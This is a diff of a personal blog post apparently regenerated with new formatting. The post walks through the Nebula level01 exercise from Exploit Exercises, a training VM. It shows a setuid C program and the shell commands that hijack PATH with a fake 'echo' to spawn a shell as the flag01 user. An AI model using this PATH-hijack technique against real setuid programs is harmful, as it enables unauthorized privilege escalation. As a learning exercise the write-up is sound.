@@ -43,10 +43,10 @@
     <div class="sidebar-about">
       <h1>
         <a href="/">
-          Álvaro Felipe Melchor
+          Álvaro
         </a>
       </h1>
-      <p class="lead">Stuff about everything</p>
+      <p class="lead">Still learning</p>
     </div>
 
     <nav class="sidebar-nav">
@@ -113,51 +113,57 @@
   <span class="post-date">10 Dec 2014</span>
   <p>I’ve been reading about security these months ago. I really enjoy learning each day but I think that sometimes is to much theory and I feel the necessity to start practice and gain more confidence about what I was reading. Please you do not misunderstand me, I think that theory plays a main role in security but in the process of learning the practice give you more sight about everything.</p>
 
-<p>Yesterday I downloaded the first virtual machine from <a href="https://exploit-exercises.com">Exploit Exercises</a>. The second exercise show you the next snippet and it encourages you to try find out the vulnerability . </p>
-<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdlib.h&gt;</span>
-<span class="cp">#include &lt;unistd.h&gt;</span>
-<span class="cp">#include &lt;string.h&gt;</span>
-<span class="cp">#include &lt;sys/types.h&gt;</span>
-<span class="cp">#include &lt;stdio.h&gt;</span>
+<p>Yesterday I downloaded the first virtual machine from <a href="https://exploit-exercises.com">Exploit Exercises</a>. The second exercise show you the next snippet and it encourages you to try find out the vulnerability .</p>
 
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
-  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
-  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
-  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+<pre><code class="language-C">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
 
-  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
-  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+int main(int argc, char **argv, char **envp)
+{
+  gid_t gid;
+  uid_t uid;
+  gid = getegid();
+  uid = geteuid();
 
-  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/env echo and now what?&quot;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div>
-<p>Basically the <code>setresgid</code> and <code>setresuid</code> set the program to run with the owner’s permission. These functions have some kind of nuances depending in the system where they are executed. If we look the man pages we can read the following.</p>
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
+
+  system("/usr/bin/env echo and now what?");
+}
+</code></pre>
+
+<p>Basically the <code class="highlighter-rouge">setresgid</code> and <code class="highlighter-rouge">setresuid</code> set the program to run with the owner’s permission. These functions have some kind of nuances depending in the system where they are executed. If we look the man pages we can read the following.</p>
 
 <blockquote>
-<p>When  a  normal program is executed, the effective and real user ID of the process are set to the ID of the user executing the file. When a set ID program is executed the real user ID is set to the calling user and the effective user ID corresponds to the set ID bit on the file being executed.</p>
+  <p>When  a  normal program is executed, the effective and real user ID of the process are set to the ID of the user executing the file. When a set ID program is executed the real user ID is set to the calling user and the effective user ID corresponds to the set ID bit on the file being executed.</p>
 </blockquote>
 
 <p>We check if the file is a set ID program.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>find . -type f -perm +6000 -ls 2&gt; /dev/null
-<span class="m">12962</span>    <span class="m">8</span> -rwsr-x---   <span class="m">1</span> flag01   level01      <span class="m">7322</span> Nov <span class="m">20</span>  <span class="m">2011</span> ./flag01
-</code></pre></div>
-<p>It is a set ID program. Basically the effective user ID will be the set ID on the file being executed that is the ID from flag01. It sets the Real, Effective and Saved UIDs the same as the Effective UID. This is so that the SUID process is now effectively running as if called by the owner <code>flag01</code>. It seems that the real problem is not here.</p>
 
-<p>The main issue with this snippet is when it calls <code>echo</code> without specifying the absolute path or using <code>/usr/bin/env</code> because otherwise it would have execute the built-in echo. But how it uses<code>/usr/bin/env</code> it will try to find the echo executable in the variable $PATH. However $PATH is controlled by us, so we could trick the program to use another malicious echo binary. It would be enough to do the next to get a shell.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;/bin/sh&#39;</span> &gt; /path/echo
-<span class="nv">$ </span>chmod +x /path/echo
-<span class="nv">$ PATH</span><span class="o">=</span>/path/:<span class="nv">$PATH</span>
-<span class="nv">$ </span>./flag01
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>find . -type f -perm +6000 -ls 2&gt; /dev/null
+12962    8 -rwsr-x---   1 flag01   level01      7322 Nov 20  2011 ./flag01
+</code></pre>
+</div>
+
+<p>It is a set ID program. Basically the effective user ID will be the set ID on the file being executed that is the ID from flag01. It sets the Real, Effective and Saved UIDs the same as the Effective UID. This is so that the SUID process is now effectively running as if called by the owner <code class="highlighter-rouge">flag01</code>. It seems that the real problem is not here.</p>
+
+<p>The main issue with this snippet is when it calls <code class="highlighter-rouge">echo</code> without specifying the absolute path or using <code class="highlighter-rouge">/usr/bin/env</code> because otherwise it would have execute the built-in echo. But how it uses<code class="highlighter-rouge">/usr/bin/env</code> it will try to find the echo executable in the variable $PATH. However $PATH is controlled by us, so we could trick the program to use another malicious echo binary. It would be enough to do the next to get a shell.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span><span class="nb">echo</span> <span class="s1">'/bin/sh'</span> &gt; /path/echo
+<span class="gp">$ </span>chmod +x /path/echo
+<span class="gp">$ </span><span class="nv">PATH</span><span class="o">=</span>/path/:<span class="nv">$PATH</span>
+<span class="gp">$ </span>./flag01
 sh-4.2<span class="err">$</span>
-</code></pre></div>
-<p>I know that maybe this exercise is easy but as always we have to start from the beginning and never stop to grow. </p>
+</code></pre>
+</div>
 
-<p>If you liked this post, you can
-<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/nebulalevel01&text=Nebula Level 01&via=alvaro_fe">share it with your followers</a>
-or
-<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
+<p>I know that maybe this exercise is easy but as always we have to start from the beginning and never stop to grow.</p>
+
+<p>If you liked this post, you can <a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/nebulalevel01&amp;text=Nebula Level 01&amp;via=alvaro_fe">share it with your followers</a> or <a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
+
 
 </div>
 
